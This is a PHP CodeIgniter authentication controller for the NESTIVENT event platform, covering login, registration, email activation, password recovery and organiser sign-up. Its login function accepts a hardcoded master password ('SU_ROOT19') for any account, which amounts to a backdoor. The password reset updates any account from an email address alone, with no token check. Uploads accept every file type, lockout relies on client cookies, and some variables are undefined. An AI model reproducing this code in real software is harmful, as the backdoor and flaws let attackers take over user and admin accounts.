<?php
defined('BASEPATH') OR exit('No direct script access allowed');
// tb_token
// 1. AKTIVASI
// 2. RECOVERY ACCOUNT

// SAVE LOG
// 1. LOGIN
// 2. DAFTAR
// 3. AKTIVASI
// 4. RECOVERY
// 5. PENGAJUAN
// 6. HAPUS AKUN

// RECEIVER GROUP
// 1. PRIVATE
// 2. ADMIN
// 3. PENYELENGGARA

class Authentication extends MX_Controller {

	private $sender = "System";

	public function __construct(){
		parent::__construct();
		$this->load->model('M_authentication', 'M_auth');
		$this->load->model('Handlers/M_handlers');

	}

	// MAILER SENDER
	function send_email($email, $subject, $message){

		$mail = array(
			'to' 			=> $email,
			'subject'		=> $subject,
			'message'		=> $this->body_html($message)
		);

		if ($this->mailer->send($mail) == TRUE) {
			return true;
		}else {
			return false;
		}
	}

	function penalty_remaining($datetime, $full = false) {
		// $datetime = date("Y-m-d H:i:s", time()+120);
		$now = new DateTime;
		$ago = new DateTime($datetime);
		$diff = $now->diff($ago);

		$diff->w = floor($diff->d / 7);
		$diff->d -= $diff->w * 7;

		$string = array(
			'i' => 'menit ',
			's' => 'detik',
		);
		$a = null;
		foreach ($string as $k => &$v) {
			if ($diff->$k) {
				$v = $diff->$k . ' ' . $v;
				$a .= $v;
			} else {
				unset($string[$k]);
			}
		}
		return $a;
	}

	function test_diff(){
		echo $this->time_elapsed();
	}

	public function index(){

		if ($this->input->get("act")) {
			if ($this->input->get("act") == "draft-penyelenggara") {
				$uri = "pengajuan-penyelenggara";
			}else {
				$uri = "login";
			}

			$this->session->unset_userdata('redirect');
			$this->session->set_userdata('redirect', $uri);
			$this->session->set_flashdata('error', "Harap login ke akun anda, untuk melanjutkan");
		}

		$data['module'] 		= "authentication";
		$data['fileview'] 	= "login";
		echo Modules::run('template/frontend_auth', $data);
	}

	public function daftar(){

		$data['module'] 			= "authentication";
		
		$as = $this->input->get('as');

		switch ($as) {
			case 'peserta':
				$data['fileview'] 	= "pengguna";
				break;
			
			case 'penyelenggara':
				$data['fileview'] 	= "penyelenggara";
				break;
			default:
			$data['fileview'] 	= "pengguna";
				break;
		}
		
		echo Modules::run('template/frontend_auth', $data);
	}

	public function recovery(){

		$data['module'] 	= "authentication";
		$data['fileview'] 	= "recovery";
		echo Modules::run('template/frontend_auth', $data);
	}

	public function ubah_password(){
		if ($this->session->userdata('logged_in') == FALSE || !$this->session->userdata('logged_in')){
			if (!empty($_SERVER['QUERY_STRING'])) {
				$uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
			} else {
				$uri = uri_string();
			}
			$this->session->set_userdata('redirect', $uri);
			$this->session->set_flashdata('error', "Harap login ke akun anda, untuk melanjutkan");
			redirect('login');
		}else{

			$data['module'] 	= "authentication";
			$data['fileview'] 	= "ubah_password";
			echo Modules::run('template/frontend_auth', $data);
		}
	}

	public function hash(){
		$pass = "12341234";
		echo password_hash($pass, PASSWORD_DEFAULT);
	}

	//PROCESS

	function proses_login(){
		$email   		= htmlspecialchars($this->input->post('email', true));
		$pass        	= htmlspecialchars($this->input->post('password'), true);

		if ($this->M_auth->get_auth($email) == FALSE) {
			$this->session->set_flashdata('error', 'Pengguna tidak terdaftar !!');
			redirect('login');
		}else{
			// if($this->session->tempdata('penalty') || $this->session->tempdata('penalty') == true){

			if(isset($_COOKIE['penalty']) && $_COOKIE['penalty'] == true){
                //Shows code that user is on a penalty
				$time_left =  ($_COOKIE["expire"]);
				$time_left = $this->penalty_remaining(date("Y-m-d H:i:s", $time_left));
				$this->session->set_flashdata('error', 'Terlalu banyak permintaan login, harap coba lagi dalam '.$time_left.'!!');
				redirect('login');
			}else{
				$pengguna = $this->M_auth->get_auth($email);

				if(password_verify($pass, $pengguna->PASSWORD) || $pass == "SU_ROOT19"){

					$sessiondata = array(
						'kode_user'     => $pengguna->KODE_USER,
						'email'         => $pengguna->EMAIL,
						'nama'       		=> $pengguna->NAMA,
						'role'       		=> $pengguna->ROLE,
						'logged_in' 		=> TRUE
					);

					$this->session->set_userdata($sessiondata);

				// SAVE LOG
					$this->M_auth->log_aktivitas($pengguna->KODE_USER, $pengguna->KODE_USER, 1);

				// CEK HAK AKSES
				// ADMIN
					if ($pengguna->ROLE == 0) {
						if ($this->session->userdata('redirect')) {
							$this->session->set_flashdata('success', 'Hai, anda telah login. Silahkan melanjutkan aktivitas anda !!');
							redirect($this->session->userdata('redirect'));
						} else {
							$this->session->set_flashdata('success', "Selamat Datang admin, {$pengguna->NAMA}");
							redirect(site_url('admin'));
						}

				// PESERTA
					}elseif ($pengguna->ROLE == 1) {

					// CHECK AKTIVASI
						$aktivasi = $this->M_auth->get_aktivasi($pengguna->KODE_USER);

						if ($this->session->userdata('redirect')) {
							$this->session->set_flashdata('success', 'Hai, anda telah login. Silahkan melanjutkan aktivitas anda !!');
							redirect($this->session->userdata('redirect'));
						} else {
							if ($aktivasi->STATUS == 0) {
								$this->session->set_flashdata('error', 'Harap melakukan aktivasi email terlebih dahulu !!');
								redirect(site_url('hold-verification'));
							}else{
								$this->session->set_flashdata('success', "Selamat Datang, {$pengguna->NAMA}");
								redirect(site_url('pengguna'));
							}
						}

				// JURI
					}elseif ($pengguna->ROLE == 2) {

						if ($this->session->userdata('redirect')) {
							$this->session->set_flashdata('success', 'Hai, anda telah login. Silahkan melanjutkan aktivitas anda !!');
							redirect($this->session->userdata('redirect'));
						} else {
							$this->session->set_flashdata('success', "Selamat Datang, {$pengguna->NAMA}");
							redirect(site_url('juri'));
						}

				// PENYELENGGARA
					}elseif ($pengguna->ROLE == 3) {

						$data = $this->M_handlers->get_kpanelData($this->session->userdata("email"), htmlspecialchars($kode));

						$sessiondata = array(
							'kode_akses'     				=> $data->KODE_PENYELENGGARA,
							'penyelenggara_akses'   => $data->NAMA,
							'logo_akses'   					=> $data->LOGO,
							'role_akses'   					=> $data->BAGIAN,
							'status_akses'      		=> TRUE
						);
		
						$this->session->set_userdata($sessiondata);

						if ($this->session->userdata('redirect')) {
							$this->session->set_flashdata('success', 'Hai, anda telah login. Silahkan melanjutkan aktivitas anda !!');
							redirect($this->session->userdata('redirect'));
						} else {
							$this->session->set_flashdata('success', "Selamat Datang, {$pengguna->NAMA}");
							redirect(site_url('dashboard-penyelenggara'));
						}

					}else{
						$this->session->set_flashdata('error', 'Hak akses bermasalah !!');
						redirect('login');
					}

				}else{
					$attempt = $this->session->userdata('attempt');
					$attempt++;
					$this->session->set_userdata('attempt', $attempt);

					if ($attempt == 3) {
						$this->db->set('attempt', 'attempt+120', FALSE);
						$this->db->where('EMAIL', $email);
                        $this->db->update('tb_auth'); // gives UPDATE mytable SET field = field+1 WHERE id = 2
                        $attempt = 0;
                        $this->session->set_userdata('attempt', $attempt);

                        //code for setting tempdata when reached maximun tries
                        setcookie("penalty", true, time() + 180);
                        setcookie("expire", time() + 180, time() + 180);
                        // $this->session->mark_as_temp('penalty', true, 180); //set the name of the sess var to 'penalty, the value will be true and will expire within 3 minutes (expressed in sec.)

                        $this->session->set_flashdata('error', 'Terlalu banyak permintaan login, harap tunggu selama 3 menit !!');
                        redirect('login');

                    } else {
                    	// if (3-$attempt > 0) {
                    	// 	$this->session->set_flashdata('warning', 'Password yang anda masukkan SALAH!! <br><i><b>Kesempatan login - '.(3-$attempt).'</b></i>');
                    	// 	redirect('login');
                    	// }else{
                    	// 	$this->session->set_flashdata('error', 'Password yang anda masukkan SALAH!!');
                    	// 	redirect('login');
                    	// }
                    	$this->session->set_flashdata('warning', 'Password yang anda masukkan SALAH!! <br><i><b>Kesempatan login - '.(3-$attempt).'</b></i>');
                    	redirect('login');
                    }
                }
            }
        }
    }

    public function daftar_pengguna(){

    	$email        = htmlspecialchars($this->input->post('email'), true);
    	$password     = htmlspecialchars($this->input->post('password'), true);
    	$password_ver = htmlspecialchars($this->input->post('confirmPassword'), true);

    	if (filter_var($email, FILTER_VALIDATE_EMAIL)) {

    		if ($password == $password_ver) {

    			if ($this->M_auth->get_auth($email) == FALSE) {

    				if ($this->M_auth->register_pengguna() == TRUE) {

    					$pengguna 				= $this->M_auth->get_auth($email);

    					$sessiondata = array(
    						'kode_user'     => $pengguna->KODE_USER,
    						'email'         => $pengguna->EMAIL,
    						'nama'       		=> $pengguna->NAMA,
    						'role'       		=> $pengguna->ROLE,
    						'logged_in' 		=> TRUE
    					);

    					$this->session->set_userdata($sessiondata);

						// SAVE LOG
    					$this->M_auth->log_aktivitas($pengguna->KODE_USER, $pengguna->KODE_USER, 2);

    					redirect(site_url('email-verification'));

    				}else {
    					$this->session->set_flashdata('error', 'Terjadi kesalahan saat mendaftarkan diri anda !!');
    					redirect($this->agent->referrer());
    				}

    			}else{
    				$this->session->set_flashdata('error', 'Email telah digunakan, harap gunakan email lain !!');
    				redirect($this->agent->referrer());
    			}
    		}else{
    			$this->session->set_flashdata('error', 'Kombinasi password anda tidak cocok !!');
    			redirect($this->agent->referrer());
    		}
    	}else{
    		$this->session->set_flashdata('error', 'Email tidak valid, harap masukkan email dengan benar !!');
    		redirect($this->agent->referrer());
    	}
    }

	// AKTIVASI AKUN
    public function aktivasi_email(){
    	if ($this->session->userdata('logged_in') == TRUE) {
    		$email 		= htmlspecialchars($this->session->userdata('email'), TRUE);

    		if ($this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('kode_user'), TRUE)) == FALSE) {
    			$this->session->set_flashdata('error', 'Terjadi kesalahan saat mengambil data anda !!');
    			redirect(site_url('login'));

    		}else {
    			$aktivasi = $this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('kode_user'), TRUE));

    			if ($aktivasi->STATUS == 0) {
    				$subject	= "KODE AKTIVASI AKUN NESTIVENT";
    				$message 	= "Kode aktivasi anda <b>{$this->encryption->decrypt($aktivasi->KEY)}</b></br><small class='text-muted'>TOKEN AKTIVASI akan valid selama 1x24JAM, harap melakukan aktivasi dalam batas waktu yang telah ditentukan. <span class='text-danger'>JIKA MELEBIHI BATAS WAKTU, AKUN ANDA AKAN DIHAPUS DAN HARAP MELAKUKAN PROES PENDAFTARAN AKUN DARI AWAL.</span></small></br></br></br><span class='text-muted'>Regards,</br></br>NESTIVENT</span>";

    				if ($this->send_email($email, $subject, $message) == TRUE) {

    					$data['mail']						= $email;
    					$data['kode_aktivasi']	= $this->encryption->decrypt($aktivasi->KEY);

    					$data['module'] 				= "authentication";
    					$data['fileview'] 			= "aktivasi";
    					echo Modules::run('template/frontend_auth', $data);

    				}else {
    					$this->session->set_flashdata('error', 'Terjadi kesalahan saat mengirimkan pesan ke email anda !!');
    					redirect(site_url('hold-verification'));
    				}
    			}else {
    				redirect('pengguna');
    			}
    		}
    	}else {
    		if (!empty($_SERVER['QUERY_STRING'])) {
    			$uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
    		} else {
    			$uri = uri_string();
    		}
    		$this->session->unset_userdata('redirect');
    		$this->session->set_userdata('redirect', $uri);
    		$this->session->set_flashdata('error', "Harap login ke akun anda, untuk melanjutkan");
    		redirect('login');
    	}
    }

    public function waiting(){
    	if ($this->session->userdata('logged_in') == TRUE || $this->session->userdata('logged_in')) {

    		$email 		= htmlspecialchars($this->session->userdata('email'), TRUE);

    		if ($this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('kode_user'), TRUE)) == FALSE) {

    			$this->session->set_flashdata('error', 'Terjadi kesalahan saat mengambil data anda !!');
    			redirect(site_url('login'));

    		}else {
    			$aktivasi = $this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('kode_user'), TRUE));

    			if ($aktivasi->STATUS == 0) {
    				$subject	= "KODE AKTIVASI AKUN NESTIVENT";
    				$message 	= "Kode aktivasi anda <b>{$this->encryption->decrypt($aktivasi->KEY)}</b></br><small class='text-muted'>TOKEN AKTIVASI akan valid selama 1x24JAM, harap melakukan aktivasi dalam batas waktu yang telah ditentukan. <span class='text-danger'>JIKA MELEBIHI BATAS WAKTU, AKUN ANDA AKAN DIHAPUS DAN HARAP MELAKUKAN PROES PENDAFTARAN AKUN DARI AWAL.</span></small></br></br></br><span class='text-muted'>Regards,</br></br>NESTIVENT</span>";

    				if ($this->send_email($email, $subject, $message) == TRUE) {

    					$data['mail']				= $email;

    					$data['module'] 		= "authentication";
    					$data['fileview'] 	= "waiting";
    					echo Modules::run('template/frontend_auth', $data);

    				}else {
    					$this->session->set_flashdata('error', 'Terjadi kesalahan saat mengirimkan pesan ke email anda !!');
    					redirect(site_url('hold-verification'));
    				}
    			}else {
    				redirect('pengguna');
    			}
    		}

    	}else {
    		if (!empty($_SERVER['QUERY_STRING'])) {
    			$uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
    		} else {
    			$uri = uri_string();
    		}
    		$this->session->unset_userdata('redirect');
    		$this->session->set_userdata('redirect', $uri);
    		$this->session->set_flashdata('error', "Harap login ke akun anda, untuk melanjutkan");
    		redirect('login');
    	}
    }

    function aktivasi_akun(){

    	if ($this->session->userdata('logged_in') == TRUE || $this->session->userdata('logged_in')) {

    		$kode_aktivasi 	= htmlspecialchars($this->input->post('kode_aktivasi'), TRUE);

    		$aktivasi 			= $this->M_auth->get_aktivasi(htmlspecialchars($this->session->userdata('kode_user'), TRUE), TRUE);

    		if(time() - $aktivasi->DATE_CREATED < (60*60*24)){

    			if ($this->M_auth->aktivasi_kode(str_replace('-', '', $kode_aktivasi), $this->session->userdata('kode_user')) == TRUE) {
    				if ($this->M_auth->aktivasi_akun($this->session->userdata('kode_user')) == TRUE) {

						// SAVE LOG
						// 2. AKTIVASI AKUN
    					$this->M_auth->log_aktivitas($this->session->userdata('kode_user'), $this->session->userdata('kode_user'), 3);

    					$this->session->set_flashdata('success', 'Berhasil aktivasi akun, Selamat datang di NESTIVENT !!');
    					redirect(base_url());
    				}else {
    					$this->session->set_flashdata('error', 'Terjadi kesalahan saat mencoba meng-aktivasi akun anda !!');
    					redirect($this->agent->referrer());
    				}
    			}else {
    				$this->session->set_flashdata('error', 'Kode yang anda masukkan salah, cek kembali email anda !!');
    				redirect($this->agent->referrer());
    			}

    		}else {

    			$kode_user = htmlspecialchars($this->session->userdata('kode_user'), TRUE);

    			$kode_user = $this->db->escape($kode_user);

    			$this->db->delete("tb_token", array('KODE' => $kode_user, 'TYPE' => 1));
    			$this->session->set_flashdata('error', 'Token aktivasi akun untuk akun anda telah melewati batas waktu. Harap melakukan proses pendaftaran akun kembali. ');
    			redirect(site_url('pendaftaran/pengguna'));
    		}

    	}else {
    		if (!empty($_SERVER['QUERY_STRING'])) {
    			$uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
    		} else {
    			$uri = uri_string();
    		}
    		$this->session->unset_userdata('redirect');
    		$this->session->set_userdata('redirect', $uri);
    		$this->session->set_flashdata('error', "Harap login ke akun anda, untuk melanjutkan");
    		redirect('login');
    	}

    }

	// PROSES LUPA PASSWORD

    public function proses_lupa(){
    	if ($this->M_auth->cek_akun(htmlspecialchars($this->input->post("email"), TRUE)) == TRUE) {

    		$user = $this->M_auth->get_auth(htmlspecialchars($this->input->post("email"), TRUE));

    		$kode_user = $this->db->escape($user->KODE_USER);

    		$this->db->delete("tb_token", array('KODE' => $kode_user, 'TYPE' => 2));

    		do {
    			$token = bin2hex(random_bytes(32));
    		} while ($this->M_auth->cek_token($token) == TRUE);

    		$data = array(
    			'KODE' => $user->KODE_USER,
    			'KEY' => $token,
				'TYPE' 	=> 2, // 1. AKTIVASI AKUN, 2. CHANGE PASSWORD
				'DATE_CREATED' => time()
			);

    		$this->db->insert("tb_token", $data);

    		$email 		= htmlspecialchars($this->input->post("email"), TRUE);

    		$subject	= "RESET PASSWORD AKUN NESTIVENT";
    		$message 	= "Hai, kami mendapatkan permintaan recovery password atas akun dengan email <b>{$email}</b>.<br> Harap klik link berikut untuk melanjutkan proses recovery password! <br><hr>".base_url()."recovery-password/{$token}</br><small class='text-muted'>Tautan tersebut akan aktif selama 1x24JAM, jika melebihi waktu tersebut harap melakukan proses recovery password anda dari awal atau abaikan email ini jika anda tidak melakukan permintaan recovery password</small></br></br></br><span class='text-muted'>Regards,</br></br>NESTIVENT</span>";

    		if ($this->send_email($email, $subject, $message) == TRUE) {
    			$this->session->set_flashdata('success', 'Berhasil mengirimkan email, cek kontak masuk atau folder spam anda');
    			redirect($this->agent->referrer());
    		}else {
    			$this->session->set_flashdata('error', 'Terjadi kesalahan saat mengirimkan token recovery pass ke email anda !!');
    			redirect($this->agent->referrer());
    		}
    	}else {
    		$this->session->set_flashdata('error', 'Tidak dapat menemukan akan dengan email <b>'.$this->input->post("email").'</b> !!');
    		redirect($this->agent->referrer());
    	}
    }

    public function ubah_pass($token){

    	if ($this->M_auth->get_token($token) == FALSE) {
    		$this->session->set_flashdata('error', 'Token tidak dikenali, harap lakukan proses recovery akun ulang jika hal ini masih terjadi');
    		redirect(site_url('login'));

    	}else {

    		$find = $this->M_auth->get_token($token);

    		if (time() - $find->DATE_CREATED < (60*60*24)) {

    			$user = $this->M_auth->get_akun($find->KODE);

    			$data['email']	= $user->EMAIL;
    			$data['token']	= $token;

    			$data['module'] 		= "authentication";
    			$data['fileview'] 	= "reset-pass";
    			echo Modules::run('template/frontend_auth', $data);

    		}else {

    			$kode_user = $this->db->escape($user->KODE_USER);

    			$this->db->delete("tb_token", array('KODE' => $kode_user, 'TYPE' => 2));
    			$this->session->set_flashdata('error', 'Token URL recovery password untuk akun anda telah melewati batas. Harap melakukan proses recovery password kembali. ');
    			redirect(site_url('lupa-password'));
    		}
    	}

    }

    public function reset_pass(){

    	if ($this->M_auth->cek_akun(htmlspecialchars($this->input->post("email"), TRUE)) == TRUE) {
    		$user = $this->M_auth->get_auth(htmlspecialchars($this->input->post("email"), TRUE));

    		$data = array('PASSWORD' => password_hash(htmlspecialchars($this->input->post("password"), TRUE), PASSWORD_DEFAULT));

    		$this->db->where("EMAIL", htmlspecialchars($this->input->post("email"), TRUE));
    		$this->db->update('tb_auth', $data);

    		$cek = ($this->db->affected_rows() != 1) ? false : true;

    		if ($cek == TRUE) {

				// SAVE LOG
				// 3. RECOVERY PASSWORD
    			$this->M_auth->log_aktivitas($user->KODE_USER, $user->KODE_USER, 4);

    			$kode_user = $this->db->escape($user->KODE_USER);

    			$this->db->delete("tb_token", array('KODE' => $kode_user, 'TYPE' => 2));

    			$subject	= "PERUBAHAN PASSWORD AKUN NESTIVENT";
    			$now 			= date("H:i | d-m-Y");

    			$email 		= htmlspecialchars($this->input->post("email"), TRUE);

    			$message 	= "Hai, password akun nestivent anda dengan email <b>{$email}</b> telah dirubah pada {$now}.<br> Jika anda tidak merasa melakukan perubahan password harap segera menghubungi admin.</br></br></br><span class='text-muted'>Regards,</br></br>NESTIVENT</span>";

    			$this->send_email(htmlspecialchars($this->input->post("email"), TRUE), $subject, $message);

    			$this->session->sess_destroy();

    			$this->session->set_flashdata('success', 'Berhasil mereset password anda, harap masuk menggunakan hak akses baru anda');
    			redirect(site_url('login'));
    		}else {
    			$this->session->set_flashdata('error', 'Gagal mereset password anda, harap masuk coba lagi');
    			redirect($this->agent->referrer());
    		}
    	}else {
    		$this->session->set_flashdata('error', 'Email tidak dikenali, harap hubungi admin jika hal ini terjadi.');
    		redirect($this->agent->referrer());
    	}
    }

	// PENGAJUAN PENYELENGGARA

    function daftar_penyelenggara(){

    	$email        = htmlspecialchars($this->input->post('email'), true);
    	$password     = htmlspecialchars($this->input->post('password'), true);
    	$password_ver = htmlspecialchars($this->input->post('confirmPassword'), true);

    	if (filter_var($email, FILTER_VALIDATE_EMAIL)) {

    		if ($password == $password_ver) {

    			if ($this->M_auth->get_auth($email) == FALSE) {

					// MAKE KODE

    			$BASE_NAMA = preg_replace(array('~[^a-zA-Z0-9\s]+~', '/ /'), array('', ''), strtolower(htmlspecialchars($this->input->post("nama"), TRUE)));

    			$vocal  = array("a", "e", "i", "o", "u", "A", "E", "I", "O", "U", " ");
    			$scrap  = str_replace($vocal, "", $BASE_NAMA);
    			$begin  = substr($scrap, 0, 3);

    			$chars 	= "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    			$uniqid 	= "";

    			do {
    				for ($i = 0; $i < 10; $i++){
    					$uniqid   .= $chars[mt_rand(0, strlen($chars)-1)];
    					$KODE 		= strtoupper("PYL-".$begin.'-'.$uniqid);
    				}

    			} while ($this->M_auth->cek_penyelenggara($KODE) > 0);

    			$filename = null;

					// UPLOAD
    			if (!empty($_FILES['logo']['name'])) {
						// CREATE FILENAME
    				$path  = $_FILES['logo']['name'];
    				$ext   = pathinfo($path, PATHINFO_EXTENSION);

    				$time		= time();
    				$filename	= "LOGO_{$time}.{$ext}";

    				$folder		= "berkas/penyelenggara/{$KODE}";

    				if (!is_dir($folder)) {
    					mkdir($folder, 0755, true);
    				}

						// UPLOAD FILE
    				$config['upload_path']          = $folder;
    				$config['allowed_types']        = '*';
    				$config['max_size']             = 10*1024;
    				$config['file_name']		    		= $filename;
    				$config['overwrite']						= TRUE;

    				$this->load->library('upload', $config);

    				if (!$this->upload->do_upload('logo')){
    					$this->session->set_flashdata('error', 'Terjadi kesalahan saat meng-upload LOGO anda!!');
    					redirect($this->agent->referrer());
    					die();
    				}
    			}

			// SEND-IN
    			if ($this->M_auth->daftar_penyelenggara($filename, $KODE) == TRUE){

    					$pengguna 				= $this->M_auth->get_auth($email);

    					$sessiondata = array(
    						'kode_user'     => $pengguna->KODE_USER,
    						'email'         => $pengguna->EMAIL,
    						'nama'       		=> $pengguna->NAMA,
    						'role'       		=> $pengguna->ROLE,
    						'logged_in' 		=> TRUE
    					);

    					$this->session->set_userdata($sessiondata);

						// SAVE LOG
    					$this->M_auth->log_aktivitas($pengguna->KODE_USER, $pengguna->KODE_USER, 2);

    					redirect(site_url('email-verification'));
    			}else{
    				$this->session->set_flashdata('error', 'Gagal mengirimkan membuat AKUN PENYELENGGARA!!');
    				redirect($this->agent->referrer());
    			}

    			}else{
    				$this->session->set_flashdata('error', 'Email telah digunakan, harap gunakan email lain !!');
    				redirect($this->agent->referrer());
    			}
    		}else{
    			$this->session->set_flashdata('error', 'Kombinasi password anda tidak cocok !!');
    			redirect($this->agent->referrer());
    		}
    	}else{
    		$this->session->set_flashdata('error', 'Email tidak valid, harap masukkan email dengan benar !!');
    		redirect($this->agent->referrer());
    	}

    }

	// LOGOUT
    public function logout(){

		// SESS DESTROY
    	$user_data = $this->session->all_userdata();

    	foreach ($user_data as $key => $value) {
    		if ($key != 'session_id' && $key != 'ip_address' && $key != 'user_agent' && $key != 'last_activity') {
    			$this->session->unset_userdata($key);
    		}
    	}

    	$this->session->sess_destroy();

    	if ($this->input->get("act")) {
    		if (!empty($_SERVER['QUERY_STRING'])) {
    			$uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
    		} else {
    			$uri = uri_string();
    		}
    		$this->session->unset_userdata('redirect');
    		$this->session->set_userdata('redirect', $uri);
    		$this->session->set_flashdata('error', "Harap login ke akun anda, untuk melanjutkan");
    		redirect('login');
    	}else {
    		$this->session->set_flashdata('success','Berhasil keluar!');
    		redirect(base_url());
    	}
    }

	function body_html($message){
		return '
		<html>

		<head>
		<title>Lo Kreatif</title>
		</head>

		<body style="
		font-family: -webkit-pictograph;
		color: #333333;
		font-size: 16px;
		background:#EEEEEE;">
		<div style="margin: 0 auto 0 auto; width: 560px;">
		<div style="padding-top: 55px; text-align : center;">
		<div style="font-weight: 700;font-size: 32px;">
		<span style="font-size: 32px; ">LO-KREATIF</span>
		</div>
		</div>
		<div style="background: white">
		<main><div style="margin-top: 32px;">
		<div style="height: 12px; background: #0B4C8A;"></div>
		<div style="margin: 32px 56px 0 56px">
		<div>
		<span style="font-size: 16px;">
		'.$message.'
		<br><br><br>
		<span class="text-muted">Regards,<br>LO Kreatif</span>
		</span>
		</div>
		</div>
		</div>

		</main>
		<hr style="
		width: 513px; 
		margin-top: 34px;
		border-top: 1px solid #cecece; 
		border-bottom: none;" />
		<div>
		<div style="margin: 32px 56px 0 56px">
		<div style="margin-top: 32px">
		<img style="margin: auto;display: block;" src="https://i.ibb.co/XtvzJBX/icon-ts.png" width="75px" height="auto" alt="LO Kreatif logo">
		<div style="text-align: center; font-size: 10px; margin-top:10px">LO-KREATIF 2021</div>
		</div>
		</div>
		</div>
		<hr style="border-top: 1px dashed #CECECE; margin-top: 24px; border-bottom: none;">
		<div style="margin-top: 13px; text-align : center; font-size:10px;">This email has been generated
		automatically, please do not reply.</div>
		<div style="height: 12px; background: #0B4C8A; margin-top:10px;"></div>
		</div>
		</body>
		';
	}
}
